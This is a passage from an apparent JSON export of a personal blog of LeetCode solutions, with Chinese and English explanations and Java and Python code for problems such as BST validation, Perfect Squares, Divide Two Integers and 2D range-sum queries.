while (++i &lt; list.size()) &#123; if (list.get(i) &lt;= list.get(i - 1)) return false; &#125; return true; &#125; private List&lt;Integer&gt; inOrderTraversal(TreeNode root) &#123; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); TreeNode cur = root; while (cur != null || !stack.isEmpty()) &#123; // reach left while (cur != null) &#123; stack.push(cur); cur = cur.left; &#125; cur = stack.pop(); list.add(cur.val); cur = cur.right; &#125; return list;&#125; 同样的，写完以后肯定会有疑问，是否可以边遍历边判断呢？答案当然是肯定的。既然中序遍历是一个递增序列，那么只要保存前面一个遍历节点prev，然后比较现在的节点cur是否大于前面节点prev就行了。用不到保存遍历结果。时间复杂度为$O(n)$，空间复杂度为$O(n)$。 12345678910111213141516171819public boolean isValidBST(TreeNode root) &#123; Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); TreeNode cur = root; int prevVal = Integer.MIN_VALUE; int num = 0; // the lenght of the in-order traversal while (cur != null || !stack.isEmpty()) &#123; // reach left while (cur != null) &#123; stack.push(cur); cur = cur.left; &#125; cur = stack.pop(); if (num != 0 &amp;&amp; cur.val &lt;= prevVal) return false; num++; prevVal = cur.val; cur = cur.right; &#125; return true;&#125; 但是还是可以再快一点。可以进一步降低空间复杂度为$O(1)$。因为中序遍历有多种方法，最快的一种是带有帮助函数的递归。所以可以应用该种递归，然后在递归时进行判断。这种方法击败了100%，运行时间只有0ms。 12345678910111213141516private int prev; // 前一个节点的值private int num = 0; // 遍历的节点个数public boolean isValidBST(TreeNode root) &#123; prev = Integer.MIN_VALUE; num = 0; return inorderTraversalHelper(root);&#125;private boolean inorderTraversalHelper(TreeNode root) &#123; if (root == null) return true; if (!inorderTraversalHelper(root.left)) return false; if (num++ != 0 &amp;&amp; root.val &lt;= prev) return false; prev = root.val; if (!inorderTraversalHelper(root.right)) return false; return true;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"27. Remove Element","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-27-Remove-Element/","text":"题目[Easy] Given an array and a value, remove all instances of that value in-place and return the new length. Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory. The order of elements can be changed. It doesn’t matter what you leave beyond the new length. Example: 123Given nums = [3,2,2,3], val = 3,Your function should return length = 2, with the first two elements of nums being 2. 中文题目删除一个数组中某一特定数值的元素，返回删除后的数组长度。注意点：操作结束后的数字排列顺序不需要与之前相同, 超出返回长度的部分不需要处理 思路太简单了，不解释 123456789101112131415class Solution(object): def removeElement(self, nums, val): \"\"\" :type nums: List[int] :type val: int :rtype: int \"\"\" count = 0 n = len(nums) for i in range(n): if nums[i] != val: nums[count] = nums[i] count += 1 return count","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"276. Paint Fence","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-276-Paint-Fence/","text":"There is a fence with $n$ posts, each post can be painted with one of the $k$ colors.You have to paint all the posts such that no more than two adjacent fence posts have the same color.Return the total number of ways you can paint the fence. Example: 123456789Given n=3, k=2 return 6 post 1, post 2, post 3way1 0 0 1 way2 0 1 0way3 0 1 1way4 1 0 0way5 1 0 1way6 1 1 0 Java假设paint[i]为有$i$个篱笆时的染色方案。可以分为两种情况： 最后两个篱笆颜色相同: 前$i-2$个篱笆有paint[i-2]种方案，第$i-1$个和第$i$个篱笆取相同的颜色，但是要和$i-2$个篱笆不同(题目要求不能连续超过2个篱笆颜色相同)，共有$k-1$种染色法。 最后两个篱笆颜色不同: 前$i-1$个篱笆有paint[i-1]种方案，第$i$个篱笆的颜色要和第$i-1$个篱笆颜色不同，还有$k-1$种方案。 由此，状态转移方程为： 1paint[i] = paint[i - 1] * (k - 1) + paint[i - 2] * (k - 1); 对应的Java代码为 12345678910111213/** * @param n: non-negative integer, n posts * @param k: non-negative integer, k colors * @return: an integer, the total number of ways */ public int numWays(int n, int k) &#123; if (n == 1) return k; int[] paint = new int[n]; paint[0] = k; paint[1] = k*k; for (int i = 2; i &lt; paint.length; i++) paint[i] = (k - 1) * (paint[i - 1] + paint[i - 2]); return paint[n - 1];&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"270. Closest Binary Search Tree Value","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-270-Closest-Binary-Search-Tree-Value/","text":"Given a non-empty binary search tree and a target value, find the value in the BST that is closest to the target. Note: Given target value is a floating point. You are guaranteed to have only one unique value in the BST that is closest to the target. Java二叉搜索树的二分查找。既然是二叉搜索树，不是一般的二叉树，就要充分利用二叉搜索树的性质。 123456789101112131415public int closestValue(TreeNode root, double target) &#123; int val = root.val; while (root != null) &#123; // 找到该值 if (root.val == target) return root.val; // 现在的值比以前的更加接近target if (Math.abs(root.val - target) &lt; Math.abs(val - target)) val = root.val; // 往左子树或者右子树查找 if (root.val &lt; target) root = root.right; else root = root.left; &#125; return val;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Binary Search Tree","slug":"Binary-Search-Tree","permalink":"http://larryim.cc/tags/Binary-Search-Tree/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"278. First Bad Version","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-278-First-Bad-Version/","text":"You are a product manager and currently leading a team to develop a new product. Unfortunately, the latest version of your product fails the quality check. Since each version is developed based on the previous version, all the versions after a bad version are also bad. Suppose you have $n$ versions $[1, 2, …, n]$ and you want to find out the first bad one, which causes all the following ones to be bad. You are given an API bool isBadVersion(version) which will return whether version is bad. Implement a function to find the first bad version. You should minimize the number of calls to the API. Example: 1234567Given n = 5, and version = 4 is the first bad version.call isBadVersion(3) -&gt; falsecall isBadVersion(5) -&gt; truecall isBadVersion(4) -&gt; trueThen 4 is the first bad version.","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"279. Perfect Squares","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-279-Perfect-Squares/","text":"Given a positive integer $n$, find the least number of perfect square numbers (for example, 1, 4, 9, 16, …) which sum to $n$. Example 1: 123Input: n = 12Output: 3 Explanation: 12 = 4 + 4 + 4. Example 2: 123Input: n = 13Output: 2Explanation: 13 = 4 + 9. Java考查基本的动态规划。这道题目解法有很多种，但是最直接、最快的方法是动态规划。当我们寻找和为12的平方数时，假如找到了3的平方等于9， 那么再找一下和为12-9=3的平方数，然后发现是三个1，也就是说一共有4个。顺着这个思路， 123456789dp[1] = dp[0] + dp[1] = 1dp[2] = dp[1] + dp[1] = 2dp[3] = dp[2] + dp[1] = 3dp[4] = Min&#123; dp[4-1*1]+dp[1], dp[4-2*2]+dp[4] &#125; = Min&#123; dp[3]+1, dp[0]+dp[4] &#125; = 1 dp[5] = Min&#123; dp[5-1*1]+dp[1], dp[5-2*2]+dp[4] &#125; = Min&#123; dp[4]+1, dp[1]+1 &#125; = 2 OK，还有一个特殊情况要处理一下，例如dp[4] = d[0] + dp[4]，把dp[0]定义为1，那么所有的平方数都为1，符合题目要求。下面给出完整代码： 123456789101112public int numSquares(int n) &#123; if (n &lt; 1) return 0; int [] dp = new int[n + 1]; dp[0] = 1; dp[1] = 1; for (int i = 2; i &lt;= n; i++) &#123; int min = i, s = 1; for (int j = 1; s &lt;= i; j++, s = j * j) min = Math.min(min, dp[s] + dp[i-s]); dp[i] = min; &#125; return dp[n];&#125; 内循环的时间复杂度是$O(\\log n)$,外循环的时间复杂度是$O(n)$，所以时间复杂度是$O(n\\log n)$。但是实际上dp[s=j*j]肯定等于1，因为s是一个平方数，所以可以简化为 1234567891011public int numSquares(int n) &#123; if (n &lt; 1) return 0; int [] dp = new int[n + 1]; for (int i = 1; i &lt;= n; i++) &#123; int min = i, s = 1; for (int j = 1; j *j &lt;= i; j++, s = j * j) min = Math.min(min, 1 + dp[i-s]); dp[i] = min; &#125; return dp[n];&#125; 一种巧妙的方法是把dp设置为静态变量，在多次调用时，将计算过的值立即返回。 12345678910111213private List&lt;Integer&gt; list = new ArrayList&lt;&gt;(Collections.singletonList(0));public int numSquares(int n) &#123; if (n &lt; 1) return 0; if (n &lt; list.size()) return list.get(n); for (int i = list.size(); i &lt;= n; i++) &#123; int min = i, s = 1; list.add(0); for (int j = 1; s &lt;= i; j++, s = j * j) min = Math.min(min, 1 + list.get(i-s)); list.set(i, min); &#125; return list.get(n);&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Breath-first Search","slug":"Breath-first-Search","permalink":"http://larryim.cc/tags/Breath-first-Search/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"28. Implement strStr()","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-28-Implement-strStr/","text":"题目[Easy] Implement strStr(). Return the index of the first occurrence of needle in haystack, or -1 if needle is not part of haystack. Example 1: 12Input: haystack = &quot;hello&quot;, needle = &quot;ll&quot;Output: 2 Example 2: 12Input: haystack = &quot;aaaaa&quot;, needle = &quot;bba&quot;Output: -1 中文题目实现字符串子串匹配函数strStr()。如果字符串A是字符串B的子串，则返回A在B中首次出现的地址，否则返回-1。 实际应用中常用KMP算法，但是比较复杂。 思路brute-force: 一一比对 12345678910def strStr(self, haystack, needle): if needle == \"\": return 0 for i in range(len(haystack)-len(needle)+1): for j in range(len(needle)): if haystack[i+j] != needle[j]: break if j == len(needle)-1: return i return -1 也可借用python直接对比 1234567891011class Solution(object): def strStr(self, haystack, needle): \"\"\" :type haystack: str :type needle: str :rtype: int \"\"\" for i in range(len(haystack) - len(needle)+1): if haystack[i:i+len(needle)] == needle: return i return -1","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"29. Divide Two Integers","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-29-Divide-Two-Integers/","text":"Given two integers dividend and divisor, divide two integers without using multiplication, division and mod operator. Return the quotient after dividing dividend by divisor. The integer division should truncate toward zero. Example 1: 12Input: dividend = 10, divisor = 3Output: 3 Example 2: 12Input: dividend = 7, divisor = -3Output: -2 Note: Both dividend and divisor will be 32-bit signed integers. The divisor will never be 0. Assume we are dealing with an environment which could only store integers within the 32-bit signed integer range: [$−2^{31}, 2^{31}−1$]. For the purpose of this problem, assume that your function returns $2^{31}−1$ when the division result overflows. Java找到除，最快的方法是使用二分查找，从0开始寻找到被除数。题目要求不能用乘除法，在使用二分查找的时候，使用加法循环达到乘法的效果。需要注意符号和溢出的问题。溢出的话，只有一种情况，就是-2146483648/-1这种情况，直接判断好了。 1234567891011121314151617181920212223242526272829303132333435363738394041public int divide(int dividend, int divisor) &#123; // overflow if (dividend == Integer.MIN_VALUE &amp;&amp; divisor == -1) &#123; return Integer.MAX_VALUE; &#125; int flag = 1; // dividend &lt; 0 if (dividend &lt; 0) &#123; dividend = - dividend; flag = - flag; &#125; // divisor &lt; 0 if (divisor &lt; 0) &#123; divisor = - divisor; flag = -flag; &#125; int lo = 0, hi = dividend; while (lo &lt;= hi) &#123; int mid = (lo + hi) &gt;&gt;&gt; 1; int cmp = - dividend; // 计算 mid * divisor for (int i = 0; i &lt; mid; i++) &#123; cmp += divisor; &#125; if (cmp &lt; 0) lo = mid + 1; else if (cmp &gt; 0) hi = mid - 1; else &#123; if (flag == -1) return -mid; return mid; &#125; &#125; if (flag == - 1) return 1 - lo; return lo - 1; &#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"96. Unique Binary Search Trees","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-96-Unique-Binary-Search-Trees/","text":"Given $n$, how many structurally unique BST‘s (binary search trees) that store values 1 … $n$? Example: 12345678910Input: 3Output: 5Explanation:Given n = 3, there are a total of 5 unique BST&apos;s: 1 3 3 2 1 \\ / / / \\ \\ 3 2 1 1 3 2 / / \\ \\ 2 1 2 3 Java假设$n$个节点存在二叉搜索树的个数是$G(n)$，可以选取$0&lt;i&lt;n$为根节点，则$0\\sim i$为左子树，$i+1\\sim n$为右子树。而右子树也可以以这种方式构建。假设选取$0&lt;i&lt;n$为根节点，则左子树的个数为$G(i-1)$，右子树的的个数为$G(n-i)$，所以以$i$为根节点的二叉搜索树一共有$G(i-1)\\times G(n-i)$种。最终形成的二叉搜索树一共有$\\sum_{i=0}^{i=n} G(i-1)\\times G(n-i)$种。 12345678910public int numTrees(int n) &#123; int[] G = new int[n + 1]; G[0] = 1; for (int nn = 1; nn &lt;= n; ++nn) for (int i = 1; i &lt;= nn; ++i) G[nn] += G[i - 1] * G[nn - i]; return G[n];&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"287. Find the Duplicate Number","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-287-Find-the-Duplicate-Number/","text":"Given an array nums containing $n + 1$ integers where each integer is between 1 and $n$ (inclusive), prove that at least one duplicate number must exist. Assume that there is only one duplicate number, find the duplicate one. Example 1: 12Input: [1,3,4,2,2]Output: 2 Example 2: 12Input: [3,1,3,4,2]Output: 3 Note: You must not modify the array (assume the array is read only). You must use only constant, O(1) extra space. Your runtime complexity should be less than $O(n^2)$. There is only one duplicate number in the array, but it could be repeated more than once. Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"95. Unique Binary Search Trees II","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-95-Unique-Binary-Search-Trees-II/","text":"Given an integer $n$, generate all structurally unique BST‘s (binary search trees) that store values $1 … n$. Example: 1234567891011121314151617Input: 3Output:[ [1,null,3,2], [3,2,null,1], [3,1,null,null,2], [2,1,3], [1,null,2,null,3]]Explanation:The above output corresponds to the 5 unique BST&apos;s shown below: 1 3 3 2 1 \\ / / / \\ \\ 3 2 1 1 3 2 / / \\ \\ 2 1 2 3 Java如果理解了LeetCode 96. Unique Binary Search Trees的话，这道题目的思路肯定是有的，关键是注意具体的实现细节。 123456789101112131415161718192021222324252627282930313233343536373839404142434445public List&lt;TreeNode&gt; generateTrees(int n) &#123; int[] nodeVals = new int[n]; for (int i = 0; i &lt; n; i++) nodeVals[i] = i + 1; List&lt;TreeNode&gt; res = constructBinarySearchTree(nodeVals, 0, n); return res; &#125; private List&lt;TreeNode&gt; constructBinarySearchTree(int[] nodeVals, int start, int end) &#123; List&lt;TreeNode&gt; list = new ArrayList&lt;&gt;(); // null if (start &gt;= end) return list; // 只有根节点 if (start + 1 == end) &#123; list.add(new TreeNode(nodeVals[start])); return list; &#125; // 完全在右边 for (TreeNode rightNode : constructBinarySearchTree(nodeVals, start + 1, end)) &#123; TreeNode root = new TreeNode(nodeVals[start]); root.left = null; root.right = rightNode; list.add(root); &#125; // 完全在左边 for (TreeNode leftNode : constructBinarySearchTree(nodeVals, start, end - 1)) &#123; TreeNode root = new TreeNode(nodeVals[end - 1]); root.left = leftNode; root.right = null; list.add(root); &#125; // 左右都有 for (int i = start + 1; i &lt; end - 1; i++)&#123; for (TreeNode leftNode : constructBinarySearchTree(nodeVals, start, i)) &#123; for (TreeNode rightNode : constructBinarySearchTree(nodeVals, i + 1, end)) &#123; TreeNode root = new TreeNode(nodeVals[i]); root.left = leftNode; root.right = rightNode; list.add(root); &#125; &#125; &#125; return list;&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"297. Serialize and Deserialize Binary Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-297-Serialize-and-Deserialize-Binary-Tree/","text":"Serialization is the process of converting a data structure or object into a sequence of bits so that it can be stored in a file or memory buffer, or transmitted across a network connection link to be reconstructed later in the same or another computer environment. Design an algorithm to serialize and deserialize a binary tree. There is no restriction on how your serialization/deserialization algorithm should work. You just need to ensure that a binary tree can be serialized to a string and this string can be deserialized to the original tree structure. Example: 123456789You may serialize the following tree: 1 / \\ 2 3 / \\ 4 5as &quot;[1,2,3,null,null,4,5]&quot; Clarification: The above format is the same as how LeetCode serializes a binary tree. You do not necessarily need to follow this format, so please be creative and come up with different approaches yourself. Note: Do not use class member/global/static variables to store states. Your serialize and deserialize algorithms should be stateless. Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Design","slug":"Design","permalink":"http://larryim.cc/tags/Design/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"941. Valid Mountain Array","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-941-Valid-Mountain-Array/","text":"Given an array A of integers, return true if and only if it is a valid mountain array. Recall that A is a mountain array if and only if: A.length &gt;= 3 There exists some $i$ with 0 &lt; $i$ &lt; A.length - 1 such that: A[0] &lt; A[1] &lt; … A[$i$-1] &lt; A[$i$] A[$i$] &gt; A[$i$+1] &gt; … &gt; A[B.length - 1] Example 1: 12345678910Input: [2,1]Output: falseExample 2:Input: [3,5,5]Output: falseExample 3:Input: [0,3,2,1]Output: true Note: 0 &lt;= A.length &lt;= 10000 0 &lt;= A[$i$] &lt;= 10000 Java考查基本的数组操作。 一个人从一侧开始爬山。 1234567891011public boolean validMountainArray(int[] A) &#123; if (A == null || A.length &lt; 3) return false; int n = A.length; int i; for (i = 1; i &lt; n &amp;&amp; A[i] &gt; A[i - 1]; i++) ; if (i == 1 || i == n) return false; for (; i &lt; n &amp;&amp; A[i] &lt; A[i - 1]; i++) ; if (i != n) return false; return true;&#125; 两个人分别从山的两侧开始爬，如果是山，他们会在山顶相遇。 123456public boolean validMountainArray(int[] A) &#123; int n = A.length, i = 0, j = n - 1; while (i + 1 &lt; n &amp;&amp; A[i] &lt; A[i + 1]) i++; while (j &gt; 0 &amp;&amp; A[j - 1] &gt; A[j]) j--; return i &gt; 0 &amp;&amp; i == j &amp;&amp; j &lt; n - 1;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"30. Substring with Concatenation of All Words","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-30-Substring-with-Concatenation-of-All-Words/","text":"题目You are given a string, s, and a list of words, words, that are all of the same length. Find all starting indices of substring(s) in s that is a concatenation of each word in words exactly once and without any intervening characters. Example 1: 123456Input: s = &quot;barfoothefoobarman&quot;, words = [&quot;foo&quot;,&quot;bar&quot;]Output: [0,9]Explanation: Substrings starting at index 0 and 9 are &quot;barfoor&quot; and &quot;foobar&quot; respectively.The output order does not matter, returning [9,0] is fine too. Example 2: 1234Input: s = &quot;wordgoodstudentgoodword&quot;, words = [&quot;word&quot;,&quot;student&quot;]Output: [] 思路因为words中的单词可能有重复，所以要有一个dict来记录一下每个字符串的数目。然后在遍历原字符串的时候，只需要遍历单词的长度次即可，如”barfoothefoobarman”，因为目标单词的长度为3，所以只需遍历： ‘bar’ | ‘foo’ | ‘the’ | ‘foo’ | ‘bar’ | ‘man’‘arf’ | ‘oot’ | ‘hef’ | ‘oob’ | ‘arm’‘rfo’ | ‘oth’ | ‘efo’ | ‘oba’ | ‘rma’ 在遍历时，需要两个指针，一个用来标记子字符串的开始，另一个用来标记子字符串的结束。再用一个dict来记录当前字符串中单词的数量，如果下一个单词不在words中，那么清空该dict，把前指针直接跳到后指针处；如果在words中，那么相应的键值要加一，此时如果那个单词的数量超过了目标中的数目，那么前指针要不断后移直到吐出一个那个单词。通过前后指针之差是否等于所有目标单词长度之和来判断是否有目标子字符串。 123456789101112131415161718192021222324252627282930313233343536373839404142434445def findSubstring(self, s, words): \"\"\" :type s: str :type words: List[str] :rtype: List[int] \"\"\" s_length = len(s) word_num = len(words) word_length = len(words[0]) words_length = word_num * word_length result = [] words_dict = &#123;&#125; for word in words: if word in words_dict: words_dict[word] = words_dict[word] + 1 else: words_dict[word] = 1 for i in range(word_length): # 两个指针，left, right: # 一个用来标记子字符串的开始，另一个用来标记子字符串的结束 left = i right = i # curr_dict 记录当前字符串中单词的数量 curr_dict = &#123;&#125; while right + word_length &lt;= s_length: word = s[right: right + word_length] # 取出单词 right += word_length # 如果在words中，那么相应的键值要加1 # 此时如果那个单词的数量超过了目标中的数目，那么左指针要不断后移直到吐出一个那个单词。 if word in words_dict: curr_dict[word] = curr_dict[word] + 1 if word in curr_dict else 1 while curr_dict[word] &gt; words_dict[word]: curr_dict[s[left: left+word_length]] -= 1 left += word_length # 通过前后指针之差是否等于所有目标单词长度之和来判断是否有目标子字符串。 if right - left == words_length: result.append(left) else: # 如果下一个单词不在words中，那么清空该dict，把前指针直接跳到后指针处 curr_dict.clear() left = right return result","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"300. Longest Increasing Subsequence","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-300-Longest-Increasing-Subsequence/","text":"Given an unsorted array of integers, find the length of longest increasing subsequence. Example: 123Input: [10,9,2,5,3,7,101,18]Output: 4 Explanation: The longest increasing subsequence is [2,3,7,101], therefore the length is 4. Note: There may be more than one LIS combination, it is only necessary for you to return the length. Your algorithm should run in $O(n^2)$ complexity. Follow up: Could you improve it to $O(n \\log n)$ time complexity? Java","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"309. Best Time to Buy and Sell Stock with Cooldown","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-309-Best-Time-to-Buy-and-Sell-Stock-with-Cooldown/","text":"Say you have an array for which the $i^{th}$ element is the price of a given stock on day $i$. Design an algorithm to find the maximum profit. You may complete as many transactions as you like (ie, buy one and sell one share of the stock multiple times) with the following restrictions: You may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again). After you sell your stock, you cannot buy stock on next day. (ie, cooldown 1 day) Example: 123Input: [1,2,3,0,2]Output: 3 Explanation: transactions = [buy, sell, cooldown, buy, sell] Java","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"303. Range Sum Query - Immutable","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-303-Range-Sum-Query-Immutable/","text":"Given an integer array nums, find the sum of the elements between indices $i$ and $j$ ($i ≤ j$), inclusive. Example: 12345Given nums = [-2, 0, 3, -5, 2, -1]sumRange(0, 2) -&gt; 1sumRange(2, 5) -&gt; -1sumRange(0, 5) -&gt; -3 Note: You may assume that the array does not change. There are many calls to sumRange function. Java这道题目还是非常直接的。难就难在题目说有大量的函数调用。既然是大量的函数调用，肯定需要把结果以某种形式预先存储起来。是直接存储结果吗？如果直接存储每个区间[$i,j$]之间的和，需要$O(n^2)$的空间和时间复杂度，当$n$大的时候肯定是不可取的。例如当$n=1000$时，大概需要4GB的存储，这样的算法不可能被实际应用。 一种比较好的思路是将前$i$个和存储起来，那么$i$到$j$之间的和，不就是两个和的差吗？基于这个思路空间复杂度降低为$O(n)$. 1234567891011private int[] sum;public NumArray(int[] nums) &#123; sum = new int[nums.length + 1]; for (int i = 1; i &lt; sum.length; i++) sum[i] = sum[i - 1] + nums[i - 1];&#125;public int sumRange(int i, int j) &#123; return sum[j + 1] - sum[i];&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"304. Range Sum Query 2D - Immutable","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-304-Range-Sum-Query-2D-Immutable/","text":"Given a 2D matrix matrix, find the sum of the elements inside the rectangle defined by its upper left corner (row1, col1) and lower right corner (row2, col2). The above rectangle (with the red border) is defined by (row1, col1) = (2, 1) and (row2, col2) = (4, 3), which contains sum = 8. Example: 1234567891011Given matrix = [ [3, 0, 1, 4, 2], [5, 6, 3, 2, 1], [1, 2, 0, 1, 5], [4, 1, 0, 1, 7], [1, 0, 3, 0, 5]]sumRegion(2, 1, 4, 3) -&gt; 8sumRegion(1, 1, 2, 2) -&gt; 11sumRegion(1, 2, 2, 4) -&gt; 12 Note: You may assume that the matrix does not change. There are many calls to sumRegion function. You may assume that row1 ≤ row2 and col1 ≤ col2. Java这道题目是LeetCode 303. Range Sum Query - Immutable的加强版，关键是找到动态规划的状态转移方程。 一种非常巧妙的方法是将矩形的和，转换为一系列矩形的和，用sum()表示矩形的面积，例如图 中的矩形ABCD可以用OD、OB、OC、OA来表示： 1Sum(ABCD)=Sum(OD)−Sum(OB)−Sum(OC)+Sum(OA) 这样一来，只要将以(0,0)为左上角，(i,j)为右下角的矩形的面积保存起来，任意两点构造的矩形的面积就非常容易求解了。 12345678910111213141516class NumMatrix &#123; private int[][] regionSum; public NumMatrix(int[][] matrix) &#123; int m = matrix.length, n = m &gt; 0 ? matrix[0].length : 0; regionSum = new int[m + 1][n + 1]; for (int i = 1; i &lt;= m; i++) for (int j = 1; j &lt;= n; j++) regionSum[i][j] = regionSum[i - 1][j] + regionSum[i][j - 1] - regionSum[i - 1][j - 1] + matrix[i - 1][j - 1]; &#125; public int sumRegion(int row1, int col1, int row2, int col2) &#123; return regionSum[row2+1][col2+1] + regionSum[row1][col1] - regionSum[row1][col2+1] - regionSum[row2+1][col1]; &#125;&#125;","tags":[{"name":"Dynamic 